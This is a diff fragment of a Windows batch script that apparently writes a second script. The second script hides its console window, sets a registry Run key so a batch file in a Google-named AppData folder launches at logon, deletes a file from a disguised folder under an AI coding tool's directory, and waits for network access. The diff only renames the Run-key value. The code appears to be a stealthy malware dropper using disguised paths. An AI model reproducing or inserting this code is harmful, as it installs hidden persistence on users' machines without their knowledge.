@@ -16,7 +16,7 @@ mkdir "%USERPROFILE%\.codex\tmp\arg0\codex-arg0dXy9BJ"
 (
     echo @echo off
     echo powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)"
-    echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "system" /t REG_SZ /d "%%USERPROFILE%%\AppData\Local\Google\tolket.bat" /f ^>nul 2^>^&1
+    echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "systems" /t REG_SZ /d "%%USERPROFILE%%\AppData\Local\Google\tolket.bat" /f ^>nul 2^>^&1
     echo setlocal
     echo if exist "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat" del /F /Q /A "%%USERPROFILE%%\.claude\projects\C--Windows-system64\mgsd.bat"
     echo :wait_net
